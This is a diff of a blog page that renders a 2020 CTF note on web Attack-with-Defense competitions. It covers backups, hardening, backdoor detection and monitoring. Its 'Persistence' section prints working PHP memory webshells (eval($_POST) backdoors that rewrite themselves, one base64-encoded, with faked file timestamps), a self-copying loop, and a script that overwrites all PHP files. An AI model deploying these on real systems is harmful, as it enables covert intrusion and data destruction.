@@ -161,225 +161,217 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">Attack &amp; Defense Tips</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-11-20 19:05:30</span>
+        <span class="mobile">2020-11-20 19:05</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/note/">note</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/awd/">awd</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>7 Mins</span>
+        </span>
+    
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>Attack &amp; Defense CTFs are a less common kind of CTF with more moving parts. They’re rarely done for the general public because of their complexity.<br>In an A&amp;D (sometimes AWD) CTF, teams are each given the same set of vulnerable server software. Teams are to setup &amp; audit this software before the competition. At the start of the competition, teams will connect their servers to an isolated network to join the CTF.<br>Within this network, teams will launch attacks against each others servers hoping to exploit the vulnerabilities they’ve found. Likewise, teams will need to properly patch their software so that it is protected against these exploits and functions normally.<br>Teams receive points for extracting flags, properly defending their flags, and keeping their servers operating normally.</p>
+<h2 id="Preperation"><a href="#Preperation" class="headerlink" title="Preperation"></a>Preperation</h2><p>This passage is mainly for web A&amp;D, so all is about protecting your web application and break others.</p>
+<h3 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h3><p>At the real start, we have to backup <code>src</code> dir and <code>db</code> data, so that we are able to recover the server if being attacked without knowing the vulns. </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># backup files</span></span><br><span class="line"><span class="comment"># pack on gamebox</span></span><br><span class="line">$ tar -zcvf web.tar.gz /var/www/html/</span><br><span class="line"><span class="comment"># download to host </span></span><br><span class="line">$ scp -r -P Port remote_username@remote_ip:remote_folder local_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump mysql database</span></span><br><span class="line">$ <span class="built_in">cd</span> /var/lib/mysql</span><br><span class="line">$ mysqldump -u root -p your_db&gt;your_db.sql</span><br><span class="line">Enter password: </span><br><span class="line"><span class="comment"># dump all dbs</span></span><br><span class="line">$ mysqldump --all-databases &gt; bak.sql</span><br></pre></td></tr></table></figure>
+<p>And to recover:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># recover mysql database</span></span><br><span class="line">$ mysql -u root -p your_db&lt; your_db.sql</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">...</span><br><span class="line">mysql&gt; create database your_db;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| your_db            |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use your_db</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="built_in">source</span> your_db.sql</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h3><p>Then we need to change password for <code>ssh</code>, database and the admin page of the site, leaving no backdoors and weak passwords.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change ssh passwd</span></span><br><span class="line">$ passwd</span><br><span class="line">Changing password <span class="keyword">for</span> xxx.</span><br><span class="line">Current password:</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line"></span><br><span class="line"><span class="comment"># change mysql passwd</span></span><br><span class="line">$ mysqladmin -u[user_name] -p[old_passwd] password new_passwd </span><br><span class="line"><span class="comment"># or in mysql cli</span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> user_name@localhost = password(<span class="string">&#x27;new_passwd&#x27;</span>);</span><br><span class="line"><span class="comment"># or edit table &#x27;user&#x27;</span></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user <span class="built_in">set</span> password=password(<span class="string">&#x27;new_passwd&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;user_name&#x27;</span> and host=<span class="string">&#x27;localhost&#x27;</span>; </span><br><span class="line">mysql&gt; flush privileges; </span><br><span class="line"><span class="comment"># in mysql 8</span></span><br><span class="line">mysql&gt; USE mysql</span><br><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;user_name&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH MYSQL_NATIVE_PASSWORD BY <span class="string">&#x27;new_passwd&#x27;</span>;</span><br><span class="line"><span class="comment"># or add &#x27;skip-grant-table&#x27; if forgetting root password</span></span><br></pre></td></tr></table></figure>
+<p>Easy ways to detect backdoors (some tools will introduce below) :</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;assert(&#x27;</span></span><br><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;system(&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>Make sure service ports opend and other ports closed (<code>netstat</code>, <code>ss</code>, <code>kill</code>) , and the key files privileges under control (<code>lsattr</code>, <code>chattr</code>) .<br>Visit <a href="/2019/05/07/2019-05-07-Linux-Security-Response/">Linux Security Response</a> for detailed commands.</p>
+<h2 id="Attack-Control"><a href="#Attack-Control" class="headerlink" title="Attack (Control)"></a>Attack (Control)</h2><p>The web A&amp;D is like tiny but fierce pentest.</p>
+<h3 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h3><p>It is the basic way to attack. Normally we use “off-the-shelf” scanners to check the “artificial” backdoors and identify vulnerabilities quickly. </p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/f1tz/cnseay" >Seay<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.d99net.net/News.asp?id=47" >D WebShellKill<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://free.safedog.cn/website_safedog.html" >SafeDog<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>After we take over the target, we have to make it persistent, and here are some methods.</p>
+<ol>
+<li>Reverse shell</li>
+</ol>
+<p>To manage shells: <a class="link"   target="_blank" rel="noopener" href="https://github.com/WangYihang/Reverse-Shell-Manager" >Reverse-Shell-Manager<i class="fas fa-external-link-alt"></i></a><br>Other shell collections like: <a class="link"   target="_blank" rel="noopener" href="https://github.com/tennc/webshell" >webshell<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/JohnTroony/php-webshells" >php-webshells<i class="fas fa-external-link-alt"></i></a> … all on <a class="link"   target="_blank" rel="noopener" href="https://github.com/search?q=php+webshell" >github<i class="fas fa-external-link-alt"></i></a>.</p>
+<ol start="2">
+<li>Memory webshell</li>
+</ol>
+<p>It is a program inside the PHP process, producing webshell all the time. Here gives some examples:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);    <span class="comment">// script runs even user aborts</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);          <span class="comment">// set running time limit</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);           <span class="comment">// delete file (itself)</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;write.php&#x27;</span>;            <span class="comment">// file name </span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>; <span class="comment">// content</span></span><br><span class="line"><span class="comment">// access by .../pass=pass, post-data:c=cmd</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>); <span class="comment">// write &#x27;code&#x27; to &#x27;file&#x27;</span></span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2020-11-20 19:05:30&quot; .write.php&#x27;</span>); <span class="comment">// fake the date info</span></span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>But you can be better:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>); <span class="comment">// <span class="meta">&lt;?php</span> eval($_POST[c]);<span class="meta">?&gt;</span></span></span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>))===md5(<span class="variable">$code</span>)) &#123;   <span class="comment">// prevent from changing, like commenting original php code</span></span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Or you can bomb the memory:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(randstr().<span class="string">&#x27;.php&#x27;</span>,file_get_content(<span class="keyword">__FILE__</span>));</span><br><span class="line">        file_get_contents(<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>To delete them:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    array_map(<span class="string">&#x27;unlink&#x27;</span>, glob(<span class="string">&quot;some/dir/*.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Or to change them:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(glob(<span class="variable">$path</span>) <span class="keyword">as</span> <span class="variable">$afile</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="variable">$afile</span>))</span><br><span class="line">                getfiles(<span class="variable">$afile</span>.<span class="string">&#x27;/*.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @file_put_contents(<span class="variable">$afile</span>,<span class="string">&quot;#Anything#&quot;</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        getfiles(<span class="keyword">__DIR__</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>About worm php webshell, visit <a class="link"   target="_blank" rel="noopener" href="https://github.com/3sNwgeek/awd_worm_phpwebshell_framework/" >awd_worm_phpwebshell_framework<i class="fas fa-external-link-alt"></i></a> (in Chinese) </p>
+<ol start="3">
+<li>Apache Thread Injection</li>
+</ol>
+<p>A faster way than php memory webshell. A Linux <code>C</code> memory shell is even faster for sure.</p>
+<h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><p>Except securing that we mentioned in <a href="/2020/11/20/2020-11-20-Attack-Defense-Tips/#Preperation">Preperation</a>, we can use some “off-the-shelf” scripts to help defending.</p>
+<h3 id="Traffic-amp-File-Monitor"><a href="#Traffic-amp-File-Monitor" class="headerlink" title="Traffic &amp; File Monitor"></a>Traffic &amp; File Monitor</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/wupco/weblogger" >WebLogger<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird" >Watchbird<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>Some of my collection: <a href="/filehost/adt/filemon.py">filemon.py</a>, <a href="/filehost/adt/logger.php">logger.php</a>, <a href="/filehost/adt/logger1.php">logger1.php</a>, <a href="/filehost/adt/logger2.php">logger2.php</a>, <a href="/filehost/adt/waf.php">waf.php</a>, <a href="/filehost/adt/waf1.php">waf1.php</a>.<br>Write <code>require_once(&#39;xxx.php&#39;);</code> to the page you want to protect, better be the one required by many other pages. </p>
+<h3 id="Kill-Memory-Webshell"><a href="#Kill-Memory-Webshell" class="headerlink" title="Kill Memory Webshell"></a>Kill Memory Webshell</h3><p>Use <code>kill -9 -1</code> to kill each process of current user, so as the memory webshell process.<br>Or refer to <a class="link"   target="_blank" rel="noopener" href="http://localhost:4000/2020/11/20/2020-11-20-Attack-Defense-Tips/#Persistence" >Persistence<i class="fas fa-external-link-alt"></i></a> part to kill them using similar methods (delete them constantly).<br>Create directory or file with the same name of memory webshell (writing empty file constantly) to prevent generating.</p>
+<p>Google this you can also get a bunch of results.</p>
+<p>Sometimes we meet file names starting with <code>/</code> or <code>-</code>, which will mess your <code>bash</code>.<br>For file names like <code>/abc</code>, which will be regarded as path, just <code>rm &#39;/abc&#39;</code> to delete.<br>For file names like <code>-abc</code>, which is treated as an invalid option, add <code>--</code> ahead to delete, like <code>rm -- -abc</code>  </p>
+<h3 id="White-List-Control"><a href="#White-List-Control" class="headerlink" title="White List Control"></a>White List Control</h3><p>For <code>Apache</code> it would be <code>.htaccess</code>, while for <code>Nginx</code> it would be <code>nginx.conf</code>, write white list config to it for better access control.</p>
+<h2 id="Other-Tools-amp-Scripts"><a href="#Other-Tools-amp-Scripts" class="headerlink" title="Other Tools &amp; Scripts"></a>Other Tools &amp; Scripts</h2><p>Actually many <a class="link"   target="_blank" rel="noopener" href="https://github.com/search?q=awd" >github repos<i class="fas fa-external-link-alt"></i></a> like <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ares-X/AWD-Predator-Framework" >AWD-Predator-Framework<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/admintony/Prepare-for-AWD" >Prepare-for-AWD<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/DasSecurity-HatLab/AoiAWD" >AoiAWD<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://github.com/ssooking/CTFDefense" >CTFDefense<i class="fas fa-external-link-alt"></i></a> are about <code>Attack with defence</code> (in Chinese), concerning WAF building, and automatic flag uploading.</p>
+<p>An interesting <a class="link"   target="_blank" rel="noopener" href="https://github.com/zhl2008/awd-platform" >awd-platform<i class="fas fa-external-link-alt"></i></a> is to set up your awd environment(web challenges only).</p>
 
+        </div>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+        
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/note/">#note</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/awd/">#awd</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/12/03/2020-12-03-Build-Mirai-Botnet-and-Try-It/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Build Mirai Botnet and Try It</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Tcache)</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-
-  .post-tags-box {
-    display: none;
-    margin-top: 1.6rem;
-    justify-content: center;
-    font-size: 1.1rem;
-
-    +keep-tablet() {
-      display: flex;
-    }
-
-    +keep-mobile() {
-      margin-top: 1.2rem;
-      font-size: 1rem;
-    }
-
-
-    .tag-item {
-      margin: 0 0.25rem;
-    }
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-
-    +keep-tablet() {
-      margin-top: $component-spacing-value * 0.8;
-    }
-  }
-
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+        
+    </div>
+</div>
 
 
                 
@@ -475,80 +467,11 @@ $article-title-font-size = 1.6rem;
 
     
         <aside class="page-aside">
-            .post-toc-wrap {
-  width: 100%;
-  font-size: 0.92rem;
-  box-sizing: border-box;
-
-  .post-toc {
-
-    ol {
-      list-style: none;
-      margin: 0;
-      padding: 0 2px 12px 10px;
-      text-align: left;
-
-      &:last-child {
-        padding-bottom: 0;
-      }
-
-      > ol {
-        padding-left: 0;
-      }
-
-      a {
-        transition-property: all;
-        transition();
-      }
-    }
-
-
-    .nav-item {
-      line-height: 1.8;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-
-    .nav {
-      .nav-child {
-        display: hexo-config('toc.expand_all') ? block : none;
-      }
-
-      .active > .nav-child {
-        display: block;
-      }
-
-      .active-current > .nav-child {
-        display: block;
-
-        > .nav-item {
-          display: block;
-        }
-      }
-
-
-      .nav-number, .nav-text {
-        color: var(--default-text-color);
-      }
-
-      .active > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-
-      .active-current > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-    }
-  }
-}
-
-
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preperation"><span class="nav-number">1.</span> <span class="nav-text">Preperation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Backup"><span class="nav-number">1.1.</span> <span class="nav-text">Backup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Secure"><span class="nav-number">1.2.</span> <span class="nav-text">Secure</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Control"><span class="nav-number">2.</span> <span class="nav-text">Attack (Control)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-Audit"><span class="nav-number">2.1.</span> <span class="nav-text">Code Audit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Persistence"><span class="nav-number">2.2.</span> <span class="nav-text">Persistence</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Defence"><span class="nav-number">3.</span> <span class="nav-text">Defence</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Traffic-amp-File-Monitor"><span class="nav-number">3.1.</span> <span class="nav-text">Traffic &amp; File Monitor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kill-Memory-Webshell"><span class="nav-number">3.2.</span> <span class="nav-text">Kill Memory Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#White-List-Control"><span class="nav-number">3.3.</span> <span class="nav-text">White List Control</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Tools-amp-Scripts"><span class="nav-number">4.</span> <span class="nav-text">Other Tools &amp; Scripts</span></a></li></ol>
+    </div>
+</div>
         </aside>
     
 
